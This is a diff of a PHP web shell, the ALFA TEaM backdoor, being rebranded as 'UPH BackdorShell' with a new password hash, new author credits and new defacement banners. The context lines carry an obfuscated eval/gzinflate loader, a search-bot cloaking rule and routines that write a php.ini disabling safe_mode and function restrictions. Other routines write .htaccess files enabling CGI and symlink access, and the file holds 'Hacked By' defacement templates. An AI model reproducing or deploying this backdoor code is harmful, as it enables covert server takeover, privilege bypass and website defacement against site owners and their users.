@@ -26,7 +26,7 @@
  */
  $GLOBALS['NeUSMyPGXP'] = array(
 	'usmfzmlHFCje' => 'admin',
-	'paLDRhHfAovu' => 'da2cc0d1f467275e2b24d4c45c64ed39',
+	'paLDRhHfAovu' => '5b670b888a1a9fbea637d0a2bcff015a',
 	'saEuEgnDlHuL' => '1',
 	'logXKTfQPNcx' => '404',
 	'shiJVQhUrFkw' => '1',
@@ -35,7 +35,7 @@
 
 $XDmfxOnhck='fu'.'nct'.'ion'.'_'.'e'.'x'.'is'.'ts'.'';$RxPWPyQqTL='cha'.'r'.'Cod'.'e'.'A'.'t'.'';$CyvIHOdCHU='e'.'va'.'l'.'';$jgpUDiTPrk='g'.'zi'.'nf'.'l'.'at'.'e'.'';if(!$XDmfxOnhck('bas'.'e'.'6'.'4_e'.'ncod'.'e'.'')){function nIWUkxhnhj($data){if(empty($data))return;$b64='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';$o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;$ac = 0;$enc = '';$tmp_arr = array();if(!$data){return $data;}do{$o1 = $RxPWPyQqTL($data, $i++);$o2 = $RxPWPyQqTL($data, $i++);$o3 = $RxPWPyQqTL($data, $i++);$bits = $o1 << 16 | $o2 << 8 | $o3;$h1 = $bits >> 18 & 0x3f;$h2 = $bits >> 12 & 0x3f;$h3 = $bits >> 6 & 0x3f;$h4 = $bits & 0x3f;$tmp_arr[$ac++] = charAt($b64, $h1).charAt($b64, $h2).charAt($b64, $h3).charAt($b64, $h4);} while ($i < strlen($data));$enc = implode($tmp_arr, '');$r = (strlen($data) % 3);return ($r ? substr($enc, 0, ($r - 3)) : $enc).substr('===', ($r || 3));}function charCodeAt($data, $char){ return ord(substr($data, $char, 1));}function charAt($data, $char){return substr($data, $char, 1);}}else{function nIWUkxhnhj($s){$b='bas'.'e'.'6'.'4_e'.'ncod'.'e'.'';return $b($s);}}if(!$XDmfxOnhck('b'.'ase'.'6'.'4_deco'.'d'.'e')){function QFdAWqZnUX($input){if(empty($input))return;$keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$chr1 = $chr2 = $chr3 = "";$enc1 = $enc2 = $enc3 = $enc4 = "";$i = 0;$output = "";$input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);do{$enc1 = strpos($keyStr, substr($input, $i++, 1));$enc2 = strpos($keyStr, substr($input, $i++, 1));$enc3 = strpos($keyStr, substr($input, $i++, 1));$enc4 = strpos($keyStr, substr($input, $i++, 1));$chr1 = ($enc1 << 2) | ($enc2 >> 4);$chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);$chr3 = (($enc3 & 3) << 6) | $enc4;$output = $output . chr((int) $chr1);if ($enc3 != 64) {$output = $output . chr((int) $chr2);}if ($enc4 != 64) {$output = $output . chr((int) $chr3);}$chr1 = $chr2 = $chr3 = "";$enc1 = $enc2 = $enc3 = $enc4 = "";}while($i < strlen($input));return $output;}}else{function QFdAWqZnUX($s){$b='b'.'ase'.'6'.'4_deco'.'d'.'e';return $b($s);}}$gEleJRqGNj='create_fun'.'ct'.'io'.'n';$oFcbuslxiL = $gEleJRqGNj('$cq',$CyvIHOdCHU.'('.$jgpUDiTPrk.'('.'Q'.'FdAW'.'qZ'.'n'.'U'.'X'.''.'($cq)'.')'.')'.';');
 
-/* ufBAyNiLYhXtEhSseNmZlGuuOwOGcBLTnsgEApHxXujFVanOXqNpNWAMnYLMAGHaHTpIuoJkmboVlvpvaebpEaoskOINIUDeEhGI */ /* You're killing me again 🎧 Am I still in your head ? 🎧 You used to light me up 🎧 Now you shut me down -- Solevisible */ @session_start();function __ZW5jb2Rlcg($s){return nIWUkxhnhj($s);}function __ZGVjb2Rlcg($s){return QFdAWqZnUX($s);}$GLOBALS['DB_NAME'] = $GLOBALS['NeUSMyPGXP'];$check = false;if(!isset($_SESSION["alfa_settings_signature"])){$check = true;}else{if($_SESSION["alfa_settings_signature"] != md5(print_r($GLOBALS['DB_NAME'], true))){$check = true;}}if($check){$_SESSION["alfa_settings_signature"] = md5(print_r($GLOBALS['DB_NAME'], true));foreach($GLOBALS['NeUSMyPGXP'] as $key => $value){$prefix = substr($key, 0, 2);if($prefix == "us"){$GLOBALS['DB_NAME']["user"] = $value;$GLOBALS['DB_NAME']["user_rand"] = $key;}elseif($prefix == "pa"){$GLOBALS['DB_NAME']["pass"] = $value;$GLOBALS['DB_NAME']["pass_rand"] = $key;}elseif($prefix == "sa"){$GLOBALS['DB_NAME']["safemode"] = $value;$GLOBALS['DB_NAME']["safemode_rand"] = $key;}elseif($prefix == "lo"){$GLOBALS['DB_NAME']["login_page"] = $value;$GLOBALS['DB_NAME']["login_page_rand"] = $key;}elseif($prefix == "sh"){$GLOBALS['DB_NAME']["show_icons"] = $value;$GLOBALS['DB_NAME']["show_icons_rand"] = $key;}elseif($prefix == "po"){$GLOBALS['DB_NAME']["post_encryption"] = $value;$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;}}$_SESSION["alfa_db_settings"] = $GLOBALS['DB_NAME'];}else{$GLOBALS['DB_NAME'] = $_SESSION["alfa_db_settings"];}unset($GLOBALS['NeUSMyPGXP']); if(!isset($_SERVER["HTTP_HOST"]))exit();
+/* ufBAyNiLYhXtEhSseNmZlGuuOwOGcBLTnsgEApHxXujFVanOXqNpNWAMnYLMAGHaHTpIuoJkmboVlvpvaebpEaoskOINIUDeEhGI */ /* You're killing me again 🎧 Am I still in your head ? 🎧 You used to light me up 🎧 Now you shut me down -- bornete */ @session_start();function __ZW5jb2Rlcg($s){return nIWUkxhnhj($s);}function __ZGVjb2Rlcg($s){return QFdAWqZnUX($s);}$GLOBALS['DB_NAME'] = $GLOBALS['NeUSMyPGXP'];$check = false;if(!isset($_SESSION["alfa_settings_signature"])){$check = true;}else{if($_SESSION["alfa_settings_signature"] != md5(print_r($GLOBALS['DB_NAME'], true))){$check = true;}}if($check){$_SESSION["alfa_settings_signature"] = md5(print_r($GLOBALS['DB_NAME'], true));foreach($GLOBALS['NeUSMyPGXP'] as $key => $value){$prefix = substr($key, 0, 2);if($prefix == "us"){$GLOBALS['DB_NAME']["user"] = $value;$GLOBALS['DB_NAME']["user_rand"] = $key;}elseif($prefix == "pa"){$GLOBALS['DB_NAME']["pass"] = $value;$GLOBALS['DB_NAME']["pass_rand"] = $key;}elseif($prefix == "sa"){$GLOBALS['DB_NAME']["safemode"] = $value;$GLOBALS['DB_NAME']["safemode_rand"] = $key;}elseif($prefix == "lo"){$GLOBALS['DB_NAME']["login_page"] = $value;$GLOBALS['DB_NAME']["login_page_rand"] = $key;}elseif($prefix == "sh"){$GLOBALS['DB_NAME']["show_icons"] = $value;$GLOBALS['DB_NAME']["show_icons_rand"] = $key;}elseif($prefix == "po"){$GLOBALS['DB_NAME']["post_encryption"] = $value;$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;}}$_SESSION["alfa_db_settings"] = $GLOBALS['DB_NAME'];}else{$GLOBALS['DB_NAME'] = $_SESSION["alfa_db_settings"];}unset($GLOBALS['NeUSMyPGXP']); if(!isset($_SERVER["HTTP_HOST"]))exit();
 
 
 if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
@@ -1832,7 +1832,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><center><a href="http://zone-h.org/archive/notifier=ALFA%20TEaM%202012" target="_blank"><span><font class="solevisible-text" color="#0F0">UNIVERSITAS PENGENTOT HANDAL SHELL BACKDOR</font></span></a></center></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><center><a href="http://zone-h.org/archive/notifier=ALFA%20TEaM%202012" target="_blank"><span><font class="solevisible-text" color="#0F0">UPH BackdorShell</font></span></a></center></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -2207,7 +2207,7 @@ echo $e->getMessage();
 }}elseif($_POST['alfa1']=='about'){
 echo __pre()."<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
-<font color='#00A220'>Shell Coded By UPH X TEAM (ALFA TEaM)</font><br>
+<font color='#00A220'>Shell Coded By UPH BackdorShell (ALFA TEaM)</font><br>
 <font color='#00A220'>Contact : solevisible@gmail.com</font><br>
 <font color='#00A220'>Telegram Channel: @solevisible</font><br>
 <font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
@@ -2643,9 +2643,9 @@ function alfacheckupdate(){
 }
 function alfaWriteTocgiapi($name, $source){
 	@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-	@mkdir('UPH',0755);
-	__write_file("UPH/".$name, __get_resource($source));
-	@chmod("UPH/".$name, 0755);
+	@mkdir('SUPERBONE',0755);
+	__write_file("SUPERBONE/".$name, __get_resource($source));
+	@chmod("SUPERBONE/".$name, 0755);
 }
 function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
 function alfaupdateheader(){
@@ -2825,7 +2825,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='c' value='" . $GLOBALS['cwd'] ."'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);'></p><input type='submit' name='submit' value=' '></form><br><span class='copyright'>[ ./Universitas Pengentot Handal &copy; 2025-".date('Y')." ]</span></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);'></p><input type='submit' name='submit' value=' '></form><br><span class='copyright'>[ ./UPH TEAM &copy; 2012-".date('Y')." ]</span></td>
 </tr>
 </table>
 </div>
@@ -3780,7 +3780,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By UPH X TEAM</title><b>Hacked By UPH X TEAM</b></textarea><br>
+<textarea name=index rows='19' cols='103'><title>Hacked By UPH BackdorShell</title><b>Hacked By UPH BackdorShell</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['alfa6'])){
@@ -3837,7 +3837,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By UPH X TEAM</title><b>Hacked By UPH X TEAM</b></textarea><br>
+<textarea name='index' rows='19' cols='103'><title>Hacked By UPH BackdorShell</title><b>Hacked By UPH BackdorShell</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['alfa8']=='>>'){
 $s0levisible="Powered By Solevisible";
@@ -3881,7 +3881,7 @@ $table = array('td1' =>
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By UPH X TEAM</title><b>Hacked By UPH X TEAM</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
+<title>Hacked By UPH BackdorShell</title><b>Hacked By UPH BackdorShell</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
 if(isset($_POST['alfa6'])){
 $mybb_dbh = $_POST['alfa6'];
 $mybb_dbu = $_POST['alfa7'];
@@ -4026,7 +4026,7 @@ if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
 if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By UPH X TEAM(ALFA TEaM)");
+@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By UPH BackdorShell(ALFA TEaM)");
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
 if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
@@ -5478,9 +5478,9 @@ function alfacgihtaccess($m,$d='', $symname=false){
 $readme = "";
 if($symname){$readme="\nReadmeName ".trim($symname);}
 if($m=='cgi'){
-$code = "#Coded By UPH X TEAM\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
+$code = "#Coded By UPH BackdorShell\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
 }elseif($m=='sym'){
-$code = "#Coded By UPH X TEAM\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
+$code = "#Coded By UPH BackdorShell\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
